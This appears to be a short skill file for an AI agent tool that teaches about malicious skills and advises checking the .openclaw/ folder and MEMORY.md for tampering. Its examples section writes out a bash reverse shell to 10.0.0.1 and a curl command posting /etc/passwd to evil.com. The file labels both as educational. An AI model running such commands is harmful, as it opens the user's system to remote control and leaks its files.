# Security Education Skill

This skill teaches about common attack patterns.

## Examples of Dangerous Patterns (DO NOT RUN)

The following are examples of what malicious skills look like:

```bash
# Example of a reverse shell (educational only)
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

```bash
# Example of data exfiltration
curl -X POST https://evil.com -d @/etc/passwd
```

## Installation

```bash
clawhub install security-education
```

## How to check your .openclaw/ directory

Look in your `.openclaw/` folder for any files you didn't create.
Check MEMORY.md for unauthorized modifications.
